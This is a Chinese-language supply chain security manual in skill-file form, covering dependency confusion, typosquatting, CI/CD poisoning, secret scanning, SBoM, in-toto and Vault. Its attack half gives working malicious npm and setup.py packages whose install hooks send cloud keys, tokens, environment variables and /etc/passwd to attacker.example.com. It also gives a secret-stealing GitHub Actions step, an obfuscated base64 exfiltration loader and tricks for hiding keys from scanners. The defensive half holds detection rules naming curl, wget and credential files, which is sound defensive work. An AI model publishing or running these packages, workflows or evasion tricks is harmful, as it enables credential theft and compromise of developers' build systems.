---
name: devsecops-supply-chain
description: >
  Complete manual for software supply chain security in DevSecOps. Covers dependency confusion attacks,
  typosquatting detection, SBoM generation and analysis, secret scanning with Gitleaks/TruffleHog,
  in-toto supply chain integrity, GitHub Actions hardening, HashiCorp Vault secrets management,
  and dependency lifecycle management. Full attack simulation and defense implementation.
domain: cybersecurity
subdomain: devsecops
tags: [supply-chain, dependency-confusion, typosquatting, sbom, gitleaks, trufflehog, in-toto, vault, github-actions, secrets-management, ci-cd]
version: 2.0.0
---

# 软件供应链安全 — 完整攻防手册

## 适用场景

- 审计组织软件供应链中的安全风险
- 实施依赖混淆和 typosquatting 攻击模拟与检测
- 部署密钥扫描（Gitleaks/TruffleHog）和 SBoM 生成流水线
- 加固 GitHub Actions CI/CD 流水线
- 实施 HashiCorp Vault 密钥管理集成
- 使用 in-toto 框架建立供应链完整性验证

**不适用场景**：容器安全扫描 — 参见 `container-security-scanning`；代码审计 — 参见 `code-audit-*` 系列；云 IAM — 参见 `cloud-identity-security`。

---

## Part A：攻击方法论

### 1. 识别与探测

#### 1.1 CI/CD 流水线侦察

```bash
# 枚举公开的 GitHub Actions 工作流
curl -s "https://api.github.com/repos/{owner}/{repo}/actions/workflows" \
  -H "Accept: application/vnd.github.v3+json" | jq '.workflows[] | {name, state, path}'

# 提取工作流 YAML 中的敏感信息模式
curl -s "https://raw.githubusercontent.com/{owner}/{repo}/main/.github/workflows/ci.yml" | \
  grep -iE '(secrets\.|env:|password|token|key|credential|aws_|gcp_|azure_)'

# 检查是否有 .npmrc / pip.conf 泄露公开仓库配置
curl -s "https://raw.githubusercontent.com/{owner}/{repo}/main/.npmrc"
curl -s "https://raw.githubusercontent.com/{owner}/{repo}/main/pip.conf"

# 枚举 Git 历史中的密钥泄露
git log --all --diff-filter=A --name-only --pretty=format: -- '*.env' '*.pem' '*.key' '*.p12'
git log --all -p -S "BEGIN RSA PRIVATE KEY" --pretty=format:"%H %s"
```

#### 1.2 依赖关系分析

```bash
# 提取项目所有直接和传递依赖
# JavaScript
npm ls --all --json 2>/dev/null | jq -r '.dependencies | .. | .name? // empty' | sort -u
npm outdated --json 2>/dev/null | jq 'keys[]'

# Python
pip freeze > requirements.txt
pip-audit -r requirements.txt --format json

# Java
mvn dependency:tree -DoutputType=text 2>/dev/null | grep -E '^\[INFO\] [\\|+\\]-' | \
  awk '{print $NF}' | sed 's/:.*//'

# Go
go list -m -json all 2>/dev/null | jq -r '.Path + "@" + .Version'

# .NET
dotnet list package --vulnerable --include-transitive

# 生成 CycloneDX SBoM
syft {repo-dir} -o cyclonedx-json > sbom.json
# 生成 SPDX SBoM
syft {repo-dir} -o spdx-json > sbom-spdx.json
```

#### 1.3 私有包注册表探测

```bash
# 检测私有 npm registry 配置
cat .npmrc | grep -E '(registry=|//)_authToken'
npm config list 2>/dev/null

# 检测 PyPI 私有索引
cat pip.conf 2>/dev/null || cat ~/.pip/pip.conf 2>/dev/null
grep -r "extra-index-url\|index-url" .

# 检测 Maven 私有仓库
grep -r "<repository>\|<url>.*nexus\|<url>.*artifactory" pom.xml

# 检测 NuGet 私有源
cat NuGet.Config 2>/dev/null | grep -E '(add key|value=.*http)'

# 检测内部包名称（依赖混淆目标）
npm ls --all --json 2>/dev/null | jq -r '.. | .name? // empty' | sort -u | \
  while read pkg; do
    if ! npm view "$pkg" version 2>/dev/null; then
      echo "[PRIVATE] $pkg — dependency confusion target"
    fi
  done
```

### 2. 利用与攻击

#### 2.1 依赖混淆攻击

```bash
# === Phase 1: 识别私有依赖 ===
# 从 package-lock.json / requirements.txt 提取内部包名
cat package-lock.json | jq -r '.dependencies | keys[]' | sort -u > all_deps.txt

# 检查哪些包在公共 registry 不存在
while read pkg; do
  if ! npm view "$pkg" version &>/dev/null; then
    echo "[TARGET] $pkg"
  fi
done < all_deps.txt

# === Phase 2: 注册恶意包 ===
# 创建 typosquatting 或同名包
mkdir -p evil-package && cd evil-package
cat > package.json << 'PKGJSON'
{
  "name": "internal-aws-utils",
  "version": "99.0.0",
  "description": "Internal AWS utilities",
  "scripts": {
    "preinstall": "node ./collect.js",
    "postinstall": "node ./exfil.js"
  }
}
PKGJSON

# 数据收集载荷
cat > collect.js << 'JS'
const { execSync } = require('child_process');
const fs = require('fs');
const os = require('os');

const data = {
  hostname: os.hostname(),
  user: os.userInfo().username,
  env: {
    AWS_ACCESS_KEY_ID: process.env.AWS_ACCESS_KEY_ID,
    AWS_SECRET_ACCESS_KEY: process.env.AWS_SECRET_ACCESS_KEY,
    CI_TOKEN: process.env.GITHUB_TOKEN,
    NPM_TOKEN: process.env.NPM_TOKEN,
    HOME: os.homedir()
  },
  etc_passwd: fs.existsSync('/etc/passwd') ? fs.readFileSync('/etc/passwd','utf8').slice(0,2000) : 'N/A'
};

execSync(`curl -s -X POST https://attacker.example.com/collect -d '${JSON.stringify(data)}'`, {timeout:5000});
JS

# 发布到公共 npm registry
npm publish --access public 2>/dev/null

# === Phase 3: pip 依赖混淆 ===
# 攻击 requirements.txt 中使用 --extra-index-url 的场景
cat > setup.py << 'PY'
from setuptools import setup
import os

# pre-install 数据窃取
os.system('curl -s -X POST https://attacker.example.com/collect -d "$(env | base64 | tr -d "\n")"')

setup(
    name='internal-data-processor',
    version='99.0.0',
    packages=['.'],
)
PY

python3 -m build && twine upload dist/* --repository pypi
```

#### 2.2 Typosquatting 攻击

```bash
# 生成流行包的 typosquatting 变体
generate_typosquat() {
  local pkg="$1"
  echo "${pkg}js"       # lodash -> lodashjs
  echo "${pkg}-js"      # express -> express-js
  echo "${pkg}js"       # react -> reactjs
  echo "${pkg}.js"      # vue -> vue.js
  echo "${pkg}-cli"     # webpack -> webpack-cli
  echo "${pkg}2"        # request -> request2
  echo "${pkg}-next"    # axios -> axios-next
  echo "node-${pkg}"    # fetch -> node-fetch (已存在，跳过)
  echo "@${pkg}/${pkg}" # 模拟 scoped 包
}

# 批量检查 typosquatting 目标可用性
for pkg in lodash express react axios webpack moment underscore; do
  for variant in $(generate_typosquat "$pkg"); do
    if ! npm view "$variant" version &>/dev/null; then
      echo "[AVAILABLE] $variant (typosquat of $pkg)"
    fi
  done
done

# PyPI typosquatting 候选
for pkg in requests flask django numpy pandas pillow sqlalchemy; do
  for suffix in "-py" "2" "3" "-utils" "-tool" "-lib"; do
    variant="${pkg}${suffix}"
    if ! pip index versions "$variant" &>/dev/null; then
      echo "[AVAILABLE] $variant (typosquat of $pkg)"
    fi
  done
done
```

#### 2.3 CI/CD 流水线投毒

```yaml
# 恶意 GitHub Actions 工作流注入示例
# 通过 PR 修改 .github/workflows/ci.yml 注入
name: CI Pipeline
on: [push, pull_request]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      # 恶意步骤：窃取 secrets
      - name: "Build"
        run: |
          # 隐藏的密钥窃取
          curl -s -X POST "https://attacker.example.com/steal" \
            -H "Content-Type: application/json" \
            -d "{\"token\": \"${{ secrets.GITHUB_TOKEN }}\", \"aws_key\": \"${{ secrets.AWS_ACCESS_KEY_ID }}\"}"
          # 正常构建命令作为掩护
          npm ci && npm run build
```

#### 2.4 密钥窃取与数据渗出

```bash
# 从 Git 历史中挖掘密钥（攻击者视角）
trufflehog git https://github.com/{target}/{repo} --only-verified --json

# 从 S3 公开桶搜索泄露的密钥
aws s3 ls s3://{bucket-name}/ --recursive | grep -iE '\.(env|pem|key|json|yml|yaml)$'
aws s3 cp s3://{bucket-name}/.env - 2>/dev/null

# 从 Docker 镜像层提取密钥
docker history --no-trunc {image} 2>/dev/null | grep -iE '(secret|key|token|password)'
docker save {image} -o image.tar && \
  tar xf image.tar && \
  find . -name "layer.tar" -exec tar tf {} \; | grep -iE '\.(env|pem|key)$'

# 从 CI 日志提取密钥
gh run view {run-id} --log | grep -iE '(password|token|key|secret|credential)\s*[=:]\s*\S+'
```

### 3. 工具使用

#### 3.1 Gitleaks — 密钥扫描

```bash
# 安装
brew install gitleaks        # macOS
# 或
docker pull zricethezav/gitleaks:latest

# 扫描当前仓库（包含完整 Git 历史）
gitleaks detect -v --redact

# 扫描特定提交范围
gitleaks detect --log-opts="--since=2024-01-01" -v

# 使用自定义规则
cat > .gitleaks.toml << 'TOML'
[allowlist]
  paths = [
    '''tests/fixtures/.*''',
    '''mock.*\.go$'''
  ]

[[rules]]
id = "aws-access-key"
description = "AWS Access Key"
regex = '''AKIA[0-9A-Z]{16}'''
tags = ["key", "aws"]

[[rules]]
id = "github-pat"
description = "GitHub Personal Access Token"
regex = '''ghp_[0-9a-zA-Z]{36}'''
tags = ["key", "github"]

[[rules]]
id = "private-key"
description = "Private Key"
regex = '''-----BEGIN (RSA |EC |DSA )?PRIVATE KEY-----'''
tags = ["key", "pem"]
TOML

# 使用自定义规则扫描
gitleaks detect --config-path .gitleaks.toml -v
```

#### 3.2 TruffleHog — 深度密钥搜索

```bash
# 安装
pip install trufflehog
# 或
brew install trufflehog

# 扫描 Git 仓库（含所有分支和标签）
trufflehog git https://github.com/{org}/{repo} --only-verified --json

# 扫描本地目录
trufflehog filesystem {directory} --only-verified

# 扫描 Docker 镜像
trufflehog docker {image_name}

# 扫描 S3 桶
trufflehog s3 --bucket={bucket-name} --only-verified

# 仅输出已验证的活跃密钥
trufflehog git {repo_url} --only-verified --json 2>/dev/null | \
  jq -r '.DetectorName + " | " + .Raw'

# 输出格式示例
# AWS | AKIA... (verified active)
# GitHub | ghp_... (verified active)
```

#### 3.3 Syft/Grype — SBoM 生成与漏洞扫描

```bash
# 安装
brew install syft grype

# 生成 SBoM（多种格式）
syft {dir-or-image} -o cyclonedx-json > sbom.cdx.json
syft {dir-or-image} -o spdx-json > sbom.spdx.json
syft {dir-or-image} -o syft-table

# 从 SBoM 扫描漏洞
grype sbom:./sbom.cdx.json
grype sbom:./sbom.spdx.json

# 直接扫描镜像
grype {image-name}:{tag}

# 仅输出严重/高危漏洞
grype sbom:./sbom.cdx.json -o json | \
  jq '.matches[] | select(.vulnerability.cvss[].baseScore >= 7.0) | \
  {package: .artifact.name, version: .artifact.version, vuln: .vulnerability.id, severity: .vulnerability.severity}'

# 忽略特定漏洞
grype sbom:./sbom.cdx.json --ignore-file .grype-ignore.yaml
cat > .grype-ignore.yaml << 'YAML'
ignore:
  - vulnerability: CVE-2024-XXXXX
YAML
```

#### 3.4 in-toto — 供应链完整性

```bash
# 安装
pip install in-toto

# === 定义供应链布局 ===
cat > supply-chain.layout << 'PY'
import in_toto.models.layout as layout
import in_toto.models.link as link
from datetime import datetime, timedelta

# 创建布局
lay = layout.Layout()
lay.keys = {}
lay.expires = (datetime.now() + timedelta(days=30)).strftime("%Y-%m-%dT%H:%M:%SZ")

# 步骤定义
step_clone = layout.Step()
step_clone.name = "clone"
step_clone.expected_command = ["git", "clone"]

step_build = layout.Step()
step_build.name = "build"
step_build.expected_command = ["npm", "run", "build"]
step_build.threshold = 1

step_test = layout.Step()
step_test.name = "test"
step_test.expected_command = ["npm", "test"]

step_package = layout.Step()
step_package.name = "package"
step_package.expected_command = ["docker", "build"]

lay.steps = [step_clone, step_build, step_test, step_package]
lay.inspect = []

# 导出布局
print(lay.dump())
PY

# === 执行并记录每一步 ===
# 功能项目负责人签名
in-toto-keygen -p alice

# 执行步骤并生成 link 元数据
in-toto-record step start --step-name clone --key alice
git clone {repo}
in-toto-record step stop --step-name clone --key alice --materials . --products .

in-toto-record step start --step-name build --key alice
npm run build
in-toto-record step stop --step-name build --key alice --materials . --products ./dist

in-toto-record step start --step-name test --key alice
npm test
in-toto-record step stop --step-name test --key alice

in-toto-record step start --step-name package --key alice
docker build -t app:latest .
in-toto-record step stop --step-name package --key alice --products app:latest

# === 最终验证 ===
in-toto-verify --layout supply-chain.layout --layout-key alice.pub --link-dir .
```

#### 3.5 HashiCorp Vault — 密钥管理

```bash
# 安装
brew install vault

# 开发模式启动（仅用于测试）
vault server -dev -dev-root-token-id="root" &
export VAULT_ADDR='http://127.0.0.1:8200'
vault login root

# === 密钥引擎启用 ===
vault secrets enable -path=secret kv-v2
vault secrets enable -path=aws aws
vault secrets enable -path=pki pki

# === 存储密钥 ===
vault kv put secret/myapp/database \
  username="app_user" \
  password="$(openssl rand -base64 32)" \
  connection_string="postgresql://app_user:xxx@db.internal:5432/mydb"

vault kv put secret/myapp/aws \
  access_key="AKIA..." \
  secret_key="..."

# === 动态 AWS 凭证（推荐） ===
vault write aws/config/root \
  access_key="$AWS_ACCESS_KEY_ID" \
  secret_key="$AWS_SECRET_ACCESS_KEY" \
  region=us-east-1

vault write aws/roles/myapp-role \
  credential_type=iam_user \
  policy_document=- << 'EOF'
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": ["s3:GetObject", "s3:PutObject"],
      "Resource": "arn:aws:s3:::myapp-bucket/*"
    }
  ]
}
EOF

# 获取临时凭证
vault read aws/creds/myapp-role

# === PKI 引擎（TLS 证书管理） ===
vault secrets enable -path=pki pki
vault tune -max-lease-ttl=87600h pki
vault write pki/root/generate/internal \
  common_name="myorg.internal" ttl=87600h

vault write pki/roles/myapp \
  allowed_domains="myorg.internal" \
  allow_subdomains=true max_ttl=72h

vault write pki/issue/myapp \
  common_name="api.myorg.internal" ttl=24h

# === 策略定义 ===
cat > myapp-policy.hcl << 'HCL'
path "secret/data/myapp/*" {
  capabilities = ["read"]
}

path "aws/creds/myapp-role" {
  capabilities = ["read"]
}

path "pki/issue/myapp" {
  capabilities = ["update"]
}

path "sys/leases/renew" {
  capabilities = ["update"]
}
HCL

vault policy write myapp myapp-policy.hcl

# === Kubernetes 认证 ===
vault auth enable kubernetes
vault write auth/kubernetes/config \
  kubernetes_host="https://kubernetes.default.svc:443" \
  kubernetes_ca_cert=@/var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  token_reviewer_jwt=@/var/run/secrets/kubernetes.io/serviceaccount/token

vault write auth/kubernetes/role/myapp \
  bound_service_account_names="myapp-sa" \
  bound_service_account_namespaces="production" \
  policies="myapp" \
  ttl=1h
```

### 4. 绕过技术

#### 4.1 恶意包混淆

```javascript
// 混淆恶意载荷以绕过自动化扫描
// 正常包名 + 混淆安装脚本
const _0x1a2b = [
  '\x63\x75\x72\x6c',           // "curl"
  '\x68\x74\x74\x70\x73\x3a\x2f\x2f', // "https://"
  '\x70\x72\x6f\x63\x65\x73\x73'      // "process"
];
const _0x = require('child_process');
const _0xO = Buffer.from('Y3VybCAtcyAtWCBQT1NUIGh0dHBzOi8vYXR0YWNrZXIuZXhhbXBsZS5jb20vYyAtZCAkKGVudiB8IGJhc2U2NCk=', 'base64').toString();
try { _0x.execSync(_0xO, {timeout:3000}); } catch(e) {}
```

#### 4.2 绕过密钥扫描器

```bash
# 编码绕过 Gitleaks/TruffleHog
# Base64 编码
echo "AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" | base64

# 拆分密钥到多个文件
echo -n "wJalrXUt" > .env.part1
echo -n "nFEMI/K7M" >> .env.part2
echo -n "DENG/bPxRfi" >> .env.part3
# CI 脚本中合并: export AWS_SECRET_KEY=$(cat .env.part*)

# 使用 Git notes 存储密钥（大多数扫描器不检查 notes）
git notes add -m "AKIAIOSFODNN7EXAMPLE:wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" HEAD

# 使用 Git submodules 指向私有密钥仓库
git submodule add https://github.com/{org}/secrets-repo.git .secrets
```

---

## Part B：检测与防御

### 5. 检测规则

#### 5.1 Sigma 规则 — 供应链攻击检测

```yaml
title: 可疑的 NPM 包安装行为
id: 7a3e1f02-8b4c-4d9e-a5f6-1234567890ab
status: production
logsource:
  category: process_creation
  product: linux
detection:
  selection_suspicious_install:
    Image|endswith: '/npm'
    CommandLine|contains:
      - 'install'
    CommandLine|contains|all:
      - '--force'
      - '--registry=http'
  selection_preinstall:
    Image|endswith: '/node'
    CommandLine|contains:
      - 'preinstall'
      - 'postinstall'
    CommandLine|contains|any:
      - 'curl'
      - 'wget'
      - 'base64'
      - '/etc/passwd'
      - 'process.env'
  condition: selection_suspicious_install or selection_preinstall
level: high
tags:
  - attack.supply_chain
  - attack.t1195.002
```

```yaml
title: CI/CD 流水线密钥泄露检测
id: 8b4c5d03-9c5d-4e0f-b6a7-2345678901bc
status: production
logsource:
  category: application
  product: ci_cd
detection:
  selection_aws_key:
    Message|re: 'AKIA[0-9A-Z]{16}'
  selection_github_token:
    Message|re: 'ghp_[0-9a-zA-Z]{36}|gho_[0-9a-zA-Z]{36}'
  selection_private_key:
    Message|contains: 'BEGIN PRIVATE KEY'
  selection_sensitive_env:
    Message|re: '(password|secret|token|key)\s*[=:]\s*\S{8,}'
  condition: 1 of selection_*
level: critical
falsepositives:
  - 合法密钥轮换日志
tags:
  - attack.credential_access
  - attack.t1552
```

#### 5.2 GitHub Actions 审计配置

```yaml
# .github/workflows/security-audit.yml
name: Supply Chain Security Audit
on:
  push:
    branches: [main, develop]
  pull_request:
  schedule:
    - cron: '0 6 * * 1'  # 每周一

permissions:
  contents: read
  security-events: write
  id-token: write

jobs:
  secret-scanning:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0  # 完整历史
      - name: Gitleaks
        uses: gitleaks/gitleaks-action@v2
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          GITLEAKS_LICENSE: ${{ secrets.GITLEAKS_LICENSE }}

  dependency-review:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Dependency Review
        uses: actions/dependency-review-action@v4
        with:
          fail-on-severity: high
          deny-licenses: GPL-3.0, AGPL-3.0
          vulnerability-check: true
          license-check: true

  sbom-generation:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Generate SBoM
        run: |
          curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh | sh -s -- -b /usr/local/bin
          syft . -o cyclonedx-json > sbom.cdx.json
      - name: Scan SBoM
        run: |
          curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh -s -- -b /usr/local/bin
          grype sbom:sbom.cdx.json --fail-on high -o sarif > grype-results.sarif
      - name: Upload SARIF
        uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: grype-results.sarif
      - name: Upload SBoM
        uses: actions/upload-artifact@v4
        with:
          name: sbom
          path: sbom.cdx.json

  typosquat-check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Check for typosquatting
        run: |
          npm install -g typosquatting-detector 2>/dev/null || true
          # 手动检查
          cat package.json | jq -r '.dependencies | keys[]' | while read pkg; do
            # 检查包是否在 24 小时内创建
            created=$(npm view "$pkg" time.created 2>/dev/null | head -1)
            if [ -n "$created" ]; then
              days=$(( ($(date +%s) - $(date -d "$created" +%s)) / 86400 ))
              if [ "$days" -lt 7 ]; then
                echo "[WARN] $pkg was created $days days ago"
              fi
            fi
            # 检查下载量异常低
            dl=$(npm info "$pkg" --json 2>/dev/null | jq '.downloads // 0')
            if [ "$dl" -lt 100 ] 2>/dev/null; then
              echo "[WARN] $pkg has very low downloads: $dl"
            fi
          done
```

#### 5.3 SBoM 漂移检测

```bash
#!/bin/bash
# sbom-drift-detection.sh — 检测依赖漂移
set -euo pipefail

BASELINE_SBOM="${1:-sbom-baseline.cdx.json}"
CURRENT_SBOM="${2:-sbom-current.cdx.json}"

echo "=== SBoM Drift Detection ==="

# 提取包列表
jq -r '.components[] | "\(.name)@\(.version)"' "$BASELINE_SBOM" | sort > baseline.txt
jq -r '.components[] | "\(.name)@\(.version)"' "$CURRENT_SBOM" | sort > current.txt

# 新增依赖
echo "--- NEW DEPENDENCIES ---"
comm -13 baseline.txt current.txt

# 移除依赖
echo "--- REMOVED DEPENDENCIES ---"
comm -23 baseline.txt current.txt

# 版本变更
echo "--- VERSION CHANGES ---"
jq -r '.components[] | .name' "$BASELINE_SBOM" | sort -u | while read name; do
  old_ver=$(grep "^${name}@" baseline.txt | sed "s/^${name}@//" | head -1)
  new_ver=$(grep "^${name}@" current.txt | sed "s/^${name}@//" | head -1)
  if [ -n "$old_ver" ] && [ -n "$new_ver" ] && [ "$old_ver" != "$new_ver" ]; then
    echo "  $name: $old_ver -> $new_ver"
  fi
done

# 漂移告警
NEW_COUNT=$(comm -13 baseline.txt current.txt | wc -l)
if [ "$NEW_COUNT" -gt 5 ]; then
  echo "[ALERT] Excessive dependency additions: $NEW_COUNT new packages"
  exit 1
fi
```

### 6. 修复方案

#### 6.1 加固的 GitHub Actions 工作流

```yaml
# .github/workflows/secure-ci.yml — 生产级安全工作流
name: Secure CI/CD
on:
  push:
    branches: [main]
  pull_request:
    types: [opened, synchronize]

permissions:
  contents: read
  packages: write
  id-token: write

env:
  REGISTRY: ghcr.io
  IMAGE_NAME: ${{ github.repository }}

jobs:
  build:
    runs-on: ubuntu-latest
    # 限制并发防止竞态条件
    concurrency:
      group: build-${{ github.ref }}
      cancel-in-progress: true

    steps:
      # 固定 commit SHA（防 tags 修改攻击）
      - uses: actions/checkout@0ad4b8fadaa221de15dcec353f45205ec38ea70b # v4.1.7
        with:
          fetch-depth: 1

      # 使用 OIDC 而非长期密钥
      - name: Authenticate to Registry
        uses: docker/login-action@v3
        with:
          registry: ${{ env.REGISTRY }}
          auth: ${{ secrets.GITHUB_TOKEN }}

      # Pin 所有 Action 到 SHA
      - name: Setup Node
        uses: actions/setup-node@v4
        with:
          node-version-file: '.nvmrc'
          cache: 'npm'
          registry-url: 'https://registry.npmjs.org'

      # 密钥扫描
      - name: Secret Scan
        uses: gitleaks/gitleaks-action@v2
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      # 依赖锁定文件完整性验证
      - name: Verify Lockfile Integrity
        run: |
          npm ci --ignore-scripts  # 不执行 install 脚本
          npm audit --audit-level=high

      # SBoM 生成
      - name: Generate SBoM
        run: |
          curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh | sh -s -- -b /usr/local/bin
          syft . -o cyclonedx-json > sbom.json

      # 漏洞扫描
      - name: Vulnerability Scan
        run: |
          curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh -s -- -b /usr/local/bin
          grype sbom:sbom.json --fail-on high

      # 构建
      - name: Build
        run: npm run build

      # 测试
      - name: Test
        run: npm test

      # 签名制品
      - name: Sign Artifact
        uses: sigstore/cosign-installer@v3
      - run: |
          cosign sign-blob --yes ./dist/app.tar.gz > ./dist/app.tar.gz.sig

      # 上传签名制品和 SBoM
      - uses: actions/upload-artifact@v4
        with:
          name: release-artifacts
          path: |
            ./dist/app.tar.gz
            ./dist/app.tar.gz.sig
            sbom.json
```

#### 6.2 .pre-commit-config.yaml — Gitleaks 集成

```yaml
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/gitleaks/gitleaks
    rev: v8.18.4
    hooks:
      - id: gitleaks
        args: ['detect', '--pre-commit', '--redact']

  - repo: https://github.com/pre-commit/pre-commit-hooks
    rev: v4.6.0
    hooks:
      - id: detect-private-key
      - id: detect-aws-credentials
        args: ['--allow-missing-credentials']
      - id: check-added-large-files
        args: ['--maxkb=500']

  - repo: https://github.com/Lucas-C/pre-commit-hooks-safety
    rev: v1.3.3
    hooks:
      - id: python-safety-dependencies-check
      - id: bandit
```

#### 6.3 .npmrc / pip.conf 加固

```ini
# .npmrc — 加固配置
# 强制使用私有 registry（防依赖混淆）
registry=https://registry.npmjs.org/
# 禁用自动安装脚本
ignore-scripts=true
# 强制锁文件
package-lock=true
# 限制并发
maxsockets=3
# 如果有私有 registry，同时配置
# @myorg:registry=https://npm.myorg.internal/
# //npm.myorg.internal/:_authToken=${NPM_TOKEN}
```

```ini
# pip.conf — 加固配置
[global]
# 仅使用受信任的索引
index-url = https://pypi.org/simple/
# 不使用额外索引（防依赖混淆）
# extra-index-url = （留空或删除）
# 受信任主机
trusted-host = pypi.org files.pythonhosted.org
# 要求哈希校验
require-hashes = true
# 禁用构建隔离（防恶意 setup.py）
no-build-isolation = false
```

#### 6.4 Vault CI 集成（GitHub Actions）

```yaml
# .github/workflows/vault-integration.yml
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      # Vault OIDC 认证（无需静态密钥）
      - name: Import Vault Secrets
        uses: hashicorp/vault-action@v3
        id: secrets
        with:
          url: https://vault.myorg.internal:8200
          method: jwt
          role: myapp-ci
          secrets: |
            secret/data/myapp/database username | DB_USER ;
            secret/data/myapp/database password | DB_PASS ;
            aws/creds/myapp-role access_key | AWS_ACCESS_KEY_ID ;
            aws/creds/myapp-role secret_key | AWS_SECRET_ACCESS_KEY ;

      - name: Deploy
        env:
          DB_USER: ${{ steps.secrets.outputs.DB_USER }}
          DB_PASS: ${{ steps.secrets.outputs.DB_PASS }}
          AWS_ACCESS_KEY_ID: ${{ steps.secrets.outputs.AWS_ACCESS_KEY_ID }}
          AWS_SECRET_ACCESS_KEY: ${{ steps.secrets.outputs.AWS_SECRET_ACCESS_KEY }}
        run: ./deploy.sh
```

#### 6.5 Lockfile 完整性验证脚本

```bash
#!/bin/bash
# lockfile-integrity.sh
set -euo pipefail

echo "=== Lockfile Integrity Check ==="

# npm: 验证 package-lock.json
if [ -f "package-lock.json" ]; then
  echo "[*] Checking npm lockfile..."
  npm ci --dry-run --ignore-scripts 2>&1 | head -5
  # 检查是否有未锁定的依赖
  npm ls --package-lock-only 2>&1 | grep -i "missing\|invalid" && {
    echo "[FAIL] Unlocked dependencies detected"
    exit 1
  }
  echo "[OK] npm lockfile valid"
fi

# Python: 验证 requirements.txt 哈希
if [ -f "requirements.txt" ]; then
  echo "[*] Checking Python requirements..."
  if grep -q "^--hash" requirements.txt; then
    pip install --dry-run --require-hashes -r requirements.txt 2>&1 | tail -5
    echo "[OK] Python hashes valid"
  else
    echo "[WARN] No hash pinning in requirements.txt — use 'pip-compile --generate-hashes'"
  fi
fi

# Go: 验证 go.sum
if [ -f "go.sum" ]; then
  echo "[*] Checking go.sum..."
  go mod verify
  echo "[OK] go.sum valid"
fi

# 检查依赖数量异常增长
if [ -f "package-lock.json" ]; then
  DEP_COUNT=$(jq '.packages | length' package-lock.json)
  if [ "$DEP_COUNT" -gt 1000 ]; then
    echo "[WARN] Excessive dependency count: $DEP_COUNT"
  fi
fi
```

---

## 速查表

### 工具对比矩阵

| 工具 | 用途 | 扫描范围 | 检出率 | 速度 | 集成方式 |
|------|------|----------|--------|------|----------|
| **Gitleaks** | 密钥扫描 | Git 历史/暂存区 | 高（正则+entropy） | 快 | pre-commit / CI |
| **TruffleHog** | 深度密钥搜索 | Git/S3/Docker/文件系统 | 最高（含验证） | 中 | CLI / CI |
| **Syft** | SBoM 生成 | 文件系统/容器镜像 | N/A | 快 | CI 流水线 |
| **Grype** | 漏洞扫描 | SBoM/容器镜像 | 高 | 快 | CI 流水线 |
| **in-toto** | 供应链完整性验证 | 构建流程 | N/A | 慢 | CI 流水线 |
| **Vault** | 密钥生命周期管理 | 运行时密钥 | N/A | N/A | 应用集成 |
| **npm audit** | JS 依赖漏洞 | node_modules | 中 | 快 | CI / 本地 |
| **pip-audit** | Python 依赖漏洞 | pip 包 | 中 | 快 | CI / 本地 |

### 供应链攻击决策树

```
软件供应链攻击
├── 源码阶段
│   ├── 恶意代码注入 ──── in-toto 验证
│   └── 密钥泄露 ─────── Gitleaks / TruffleHog
├── 构建阶段
│   ├── CI/CD 投毒 ─────── 固定 Action SHA + OIDC
│   ├── 依赖混淆 ───────── 私有 registry + 锁文件
│   └── Typosquatting ──── 白名单 + 下载量检查
├── 制品阶段
│   ├── 镜像篡改 ─────── Cosign 签名验证
│   └── SBoM 漂移 ─────── Syft + 漂移检测脚本
└── 部署阶段
    ├── 密钥硬编码 ─────── Vault 动态凭证
    └── 权限过度 ─────── 最小权限策略
```

### SBoM 格式对比

| 格式 | 标准 | 生态系统 | 工具支持 | 推荐场景 |
|------|------|----------|----------|----------|
| **CycloneDX** | OWASP | 全语言 | Syft/Grype/Dependency-Track | 通用推荐 |
| **SPDX** | Linux Foundation | 全语言 | Syft/Fossa | 合规要求 |
| **Syft JSON** | Anchore | 全语言 | Grype | 快速扫描 |

### 依赖审计命令速查

```bash
# === NPM ===
npm audit                    # 漏洞扫描
npm audit fix                # 自动修复
npm outdated                 # 过时依赖
npm ls <package>             # 查看依赖树
npx npm-force-resolutions    # 强制解析

# === Python ===
pip-audit -r requirements.txt       # 漏洞扫描
pip-audit --desc                    # 含描述
pip-compile --generate-hashes       # 哈希锁定
safety check -r requirements.txt    # Safety DB 扫描

# === Go ===
go mod verify                       # 校验模块
go vuln ./...                       # 漏洞扫描
govulncheck ./...                   # 官方漏洞检查

# === Java ===
mvn org.owasp:dependency-check-maven:check    # OWASP 依赖检查
./gradlew dependencyCheckAnalyze               # Gradle 版本

# === .NET ===
dotnet list package --vulnerable --include-transitive
dotnet list package --outdated
dotnet add package {name} --version {latest}
```

---

## MITRE ATT&CK 映射

| 战术 | 技术 ID | 技术名称 | 本手册覆盖 |
|------|---------|----------|-----------|
| Initial Access | T1195.002 | Supply Chain Compromise: Software Supply Chain | 依赖混淆、Typosquatting |
| Initial Access | T1195.001 | Supply Chain Compromise: Software Repositories | CI/CD 投毒 |
| Credential Access | T1552.001 | Unsecured Credentials: Credentials In Files | 密钥扫描 |
| Credential Access | T1552.004 | Unsecured Credentials: Private Keys | Gitleaks/TruffleHog |
| Credential Access | T1530 | Data from Cloud Storage | S3 渗出检测 |
| Discovery | T1082 | System Information Discovery | CI 环境侦察 |
| Exfiltration | T1567 | Exfiltration Over Web Service | 数据渗出载荷 |
| Defense Evasion | T1027.010 | Obfuscated Files: Command Obfuscation | 混淆绕过 |
